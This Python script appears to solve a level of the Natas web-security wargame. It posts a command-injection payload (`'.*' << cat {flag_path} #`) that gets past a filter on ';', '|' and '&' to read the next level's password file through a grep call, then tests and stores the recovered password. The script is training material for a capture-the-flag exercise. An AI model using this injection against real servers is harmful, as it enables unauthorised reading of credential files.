"""
natas10: shell command injection with banned characters

server rejects inputs containing ';', '|', and '&'
"""

import requests
from natas_utils import *

LEVEL = 10
URL, LOGIN = load_level(LEVEL)

def main():
    # path to next level's password
    flag_path = flag_file_abspath(LEVEL + 1)

    # will be injected as $key in `grep -i $key dictionary.txt`
    shell_payload = f"'.*' << cat {flag_path} #"
    response = requests.post(URL, auth=LOGIN, data={"needle": shell_payload})

    candidate_passwords = extract_candidate_passwords(response.text)
    natas11_password = try_level_login(LEVEL + 1, candidate_passwords)

    if natas11_password:
        print("natas11:", natas11_password)
        store_level_password(LEVEL + 1, natas11_password)
    else:
        exit("Failed to get password for the next level.")

if __name__ == "__main__":
    main()